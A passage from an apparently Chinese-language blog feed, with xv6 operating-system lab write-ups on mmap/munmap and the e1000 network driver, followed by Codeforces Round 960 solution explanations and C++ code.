class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">mapfile</span><span class="params">(uint64 va)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">int</span> flag = PTE_U;</span><br><span class="line">  <span class="type">int</span> prot;</span><br><span class="line">  <span class="type">char</span> *mem;</span><br><span class="line">  <span class="type">int</span> offset = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span>* p = <span class="built_in">myproc</span>();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_REGIONS; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;vma[i].used == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;vma[i].addr &lt;= va &amp;&amp; p-&gt;vma[i].addr + p-&gt;vma[i].size - <span class="number">1</span> &gt;= va )  <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i == MAX_MMAP_REGIONS)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    prot = p-&gt;vma[i].prot;</span><br><span class="line">    <span class="keyword">if</span>(prot &amp; PROT_READ)   flag |= PTE_R;</span><br><span class="line">    <span class="keyword">if</span>(prot &amp; PROT_WRITE)  flag |= PTE_W;</span><br><span class="line">    <span class="keyword">if</span>(prot &amp; PROT_EXEC)   flag |= PTE_X;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((mem = <span class="built_in">kalloc</span>()) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">    offset = <span class="built_in">PGROUNDDOWN</span>(p-&gt;vma[i].offset + va - p-&gt;vma[i].addr) ;</span><br><span class="line">    <span class="built_in">ilock</span>(p-&gt;vma[i].file-&gt;ip);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">readi</span>(p-&gt;vma[i].file-&gt;ip, <span class="number">0</span>,(uint64)mem, offset, PGSIZE) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">iunlock</span>(p-&gt;vma[i].file-&gt;ip);</span><br><span class="line">      <span class="built_in">kfree</span>(mem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">iunlock</span>(p-&gt;vma[i].file-&gt;ip);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mappages</span>(p-&gt;pagetable, <span class="built_in">PGROUNDDOWN</span>(va), PGSIZE, (uint64)mem, flag) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">kfree</span>(mem);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来处理munmap，因为释放只会发生在映射区域首部和末尾，因此可以用size来判断文件是否已被全部解除映射。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_munmap</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 err = <span class="number">0xffffffffffffffff</span>;</span><br><span class="line">  uint64 addr;</span><br><span class="line">  <span class="type">int</span> len;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">argaddr</span>(<span class="number">0</span>, &amp;addr) || <span class="built_in">argint</span>(<span class="number">1</span>, &amp;len))</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_REGIONS; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;vma[i].addr == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;vma[i].size &gt;= len)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>(addr == p-&gt;vma[i].addr)</span><br><span class="line">          &#123;</span><br><span class="line">            p-&gt;vma[i].size -= len;</span><br><span class="line">            p-&gt;vma[i].addr += len;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(addr == p-&gt;vma[i].addr + len)</span><br><span class="line">          &#123;</span><br><span class="line">            p-&gt;vma[i].size -= len;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">         </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i == MAX_MMAP_REGIONS) <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;vma[i].flag == MAP_SHARED &amp;&amp;(p-&gt;vma[i].prot &amp; PROT_WRITE) != <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">filewrite</span>(p-&gt;vma[i].file, addr, len);</span><br><span class="line"><span class="comment">//这里的写回好像有点问题，</span></span><br><span class="line">    <span class="comment">//如何处理偏移问题和crash问题。TODO</span></span><br><span class="line">    <span class="built_in">uvmunmap</span>(p-&gt;pagetable, addr, len/PGSIZE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(p-&gt;vma[i].size == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fileclose</span>(p-&gt;vma[i].file);</span><br><span class="line">    p-&gt;vma[i].used = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是处理子进程问题，我们需要复制VMA结构体，并添加对文件的引用计数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">fork</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; MAX_MMAP_REGIONS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;vma[i].used) &#123;</span><br><span class="line">      <span class="built_in">memmove</span>(&amp;np-&gt;vma[i], &amp;p-&gt;vma[i], <span class="built_in">sizeof</span>(p-&gt;vma[i]));</span><br><span class="line">      <span class="built_in">filedup</span>(p-&gt;vma[i].file);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">release</span>(&amp;np-&gt;lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在退出时判断是否需要写入文件。由于我们的内存全部分配在堆上，所以可以由<code>proc_freepagetable</code>取消映射和释放内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">exit</span><span class="params">(<span class="type">int</span> status)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(p == initproc)</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;init exiting&quot;</span>);</span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_MMAP_REGIONS; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;vma[i].used) &#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;vma[i].flag == MAP_SHARED &amp;&amp; (p-&gt;vma[i].prot &amp; PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">filewrite</span>(p-&gt;vma[i].file, p-&gt;vma[i].addr, p-&gt;vma[i].size);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">fileclose</span>(p-&gt;vma[i].file);</span><br><span class="line">      p-&gt;vma[i].used = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XV6 0x11</title>
      <link href="/2024/07/21/OS/xv6_0x11/"/>
      <url>/2024/07/21/OS/xv6_0x11/</url>
      
        <content type="html"><![CDATA[<h1 id="lab11"><a href="#lab11" class="headerlink" title="lab11"></a>lab11</h1><h3 id="networks"><a href="#networks" class="headerlink" title="networks"></a>networks</h3><ul><li>arp：将互联网协议（IP）地址解析为对应的媒体访问控制（MAC）地址。</li><li>ip：定义了数据包的格式以及如何在源和目的地之间传输这些数据包。</li><li>udp、tcp：UDP和TCP都是传输层协议，它们在IP层之上，负责应用间的数据传输。</li><li>网卡与处理线程之间有接收队列、和发送队列，以控制网络流量。</li><li><code>DMA（直接内存访问）环</code>允许硬件（如网络接口卡NIC）直接访问系统内存，而无需CPU的干预。</li><li>考虑一个路由器接收和转发包<ul><li>随着输入数据包的增多，转发的数据包也增多</li><li>受限于cpu等因素达到最大值</li><li>因中断活锁不断产生中断，导致cpu时间全部用于处理中断</li><li>解决方案：通过设置一个中断线程轮询，当有数据包到达时产生中断，唤醒线程，处理数据包；当数据包处理完成时，再重新打开中断，线程休眠。</li></ul></li></ul><h3 id="Your-Job（hard）"><a href="#Your-Job（hard）" class="headerlink" title="Your Job（hard）"></a>Your Job（hard）</h3><p>实验要求是我们实现网卡驱动中与发送与接收队列的部分。因为可能会有多线程同时向网卡发送数据，这里我们需要加锁来保护发送DMA环。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">e1000_transmit</span><span class="params">(<span class="keyword">struct</span> mbuf *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// the mbuf contains an ethernet frame; program it into</span></span><br><span class="line">  <span class="comment">// the TX descriptor ring so that the e1000 sends it. Stash</span></span><br><span class="line">  <span class="comment">// a pointer so that it can be freed after sending.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;e1000_lock);</span><br><span class="line">  <span class="type">int</span> i = regs[E1000_TDT];</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">if</span>((tx_ring[i].status &amp; E1000_TXD_STAT_DD) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">release</span>(&amp;e1000_lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(tx_mbufs[i] != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">mbuffree</span>(tx_mbufs[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  tx_ring[i].addr = (uint64) m-&gt;head;</span><br><span class="line">  tx_ring[i].length = m-&gt;len;</span><br><span class="line">  tx_mbufs[i] = m;</span><br><span class="line">  </span><br><span class="line">  tx_ring[i].cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_RS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  regs[E1000_TDT] = (i + <span class="number">1</span>) % TX_RING_SIZE;</span><br><span class="line"> <span class="comment">// printf(&quot;%d\n&quot;, regs[E1000_TDT]);</span></span><br><span class="line">  <span class="comment">//printf(&quot;transmit\n&quot;);</span></span><br><span class="line">  <span class="built_in">release</span>(&amp;e1000_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在recv中，我们不需要加锁。</p><ul><li>首先，对接收DMA环来说，只有网卡在写入数据，可以认为是单线程写入</li><li>当接收DMA环内有数据时，触发中断，调用该函数。且我们在函数内的实现是尽可能读更多的数据。当数据量大时，可能出现包丢失和重复。别忘了，上层还有传输层协议TCP、UDP来应对这些问题。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">e1000_recv</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Your code here.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Check for packets that have arrived from the e1000</span></span><br><span class="line">  <span class="comment">// Create and deliver an mbuf for each packet (using net_rx()).</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">//acquire(&amp;e1000_lock);</span></span><br><span class="line"> </span><br><span class="line">  <span class="type">int</span> i = (regs[E1000_RDT] + <span class="number">1</span>) % RX_RING_SIZE;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span>((rx_ring[i].status &amp; E1000_RXD_STAT_DD) == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  rx_mbufs[i]-&gt;len = rx_ring[i].length;</span><br><span class="line">  <span class="built_in">net_rx</span>(rx_mbufs[i]);</span><br><span class="line"></span><br><span class="line">  rx_mbufs[i] = <span class="built_in">mbufalloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (!rx_mbufs[i])</span><br><span class="line">    <span class="built_in">panic</span>(<span class="string">&quot;e1000_recv&quot;</span>);</span><br><span class="line"></span><br><span class="line">  rx_ring[i].addr = (uint64) rx_mbufs[i]-&gt;head;</span><br><span class="line">  rx_ring[i].status = <span class="number">0</span>;</span><br><span class="line">  i = (i + <span class="number">1</span>) % RX_RING_SIZE;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  regs[E1000_RDT] = (i - <span class="number">1</span> + RX_RING_SIZE) % RX_RING_SIZE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//release(&amp;e1000_lock);</span></span><br><span class="line"> <span class="comment">// printf(&quot;recv\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
          <category> xv6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> xv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 960 (Div. 2)</title>
      <link href="/2024/07/20/codeforce/2024_7_20/"/>
      <url>/2024/07/20/codeforce/2024_7_20/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724100644708.png" alt="image-20240724100644708"></p><blockquote><p>这题在一次操作中，玩家可以执行以下操作：</p><ul><li><p>选择一个索引 iii (1 ≤ i ≤ n)，使得 a[i] ≥ mx，并将 mx 设为 a[i]。然后，将 a[i] 设为 0。</p></li><li><p>Alice先手，判断 Alice 是否有必胜策略。</p></li></ul></blockquote><p>刚开始我兴冲冲取最大值，判断是否为奇数，然后就WA了。</p><p>其实这题属于博弈论，只要有一个数的数量为奇数，则Alice获胜</p><ul><li>Alice选择<code>最大</code>的奇数，取走一个数，该数的数量变为偶数。</li><li>此时该数后的数后的数的数量都为偶数，则该问题转变为对手的问题，我们易推断出对手必输。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">105</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="type">int</span> arr[N];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">      arr[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">      <span class="type">int</span> num;</span><br><span class="line">      cin &gt;&gt; num;</span><br><span class="line">      arr[num]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">50</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (arr[i] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!flag)</span><br><span class="line">      cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724112132952.png" alt="image-20240724112132952"></p><p>构造+贪心，</p><ul><li>对于所有 1≤i≤n，a[i] 要么是 1，要么是 -1；</li><li>数组 a 的最大前缀位置是 x；</li><li>数组 a 的最大后缀位置是 y。</li><li>n𝑛, x𝑥, and y𝑦 (2≤n≤105,1≤y&lt;x≤n)2≤𝑛≤105,1≤𝑦&lt;𝑥≤𝑛).</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span><span class="number">+10</span>;</span><br><span class="line"><span class="type">int</span> n,x,y;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin &gt;&gt; t;</span><br><span class="line">    <span class="keyword">while</span>(t -- )</span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; n &gt;&gt; x &gt;&gt; y;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = y - <span class="number">1</span>, j = <span class="number">-1</span>; i &gt;= <span class="number">0</span>;i --, j = -j)</span><br><span class="line">            a[i] = j;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = y ; i &lt;= x;i ++)</span><br><span class="line">            a[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = x + <span class="number">1</span>, j = <span class="number">-1</span>; i &lt;= n;i ++, j = -j)</span><br><span class="line">            a[i] = j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt;= n;i ++)</span><br><span class="line">            cout &lt;&lt; a[i] &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        cout &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="c"><a href="#c" class="headerlink" title="c"></a>c</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724112246114.png" alt="image-20240724112246114"></p><ol><li>设置 ( sum :=<script type="math/tex">sum + \sum_{i=1}^{n} a_i</script>)</li><li>设 ( b ) 为大小为 ( n ) 的数组。对于所有 ( <script type="math/tex">1 \leq i \leq n</script> )，设置 ( b_i := MAD(<script type="math/tex">[a_1, a_2, \ldots, a_i]</script>) )，然后设置 ( <script type="math/tex">a_i := b_i</script>)</li></ol><p>找到该过程结束后 ( sum ) 的值。</p><ul><li><p>这里的mad是会随着数组的移动更新</p></li><li><p>第一次会将前面（第一次有重复数字的位置前）没有重复的数字设置为0</p></li><li>第二次会将后面（第一次有重复数字的位置后）的数字设置为对应数字</li><li>那么我们就需要模拟出前两次循环，然后将后面的数累计即可。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200005</span>;</span><br><span class="line"><span class="type">int</span> a[N], c[N];</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span 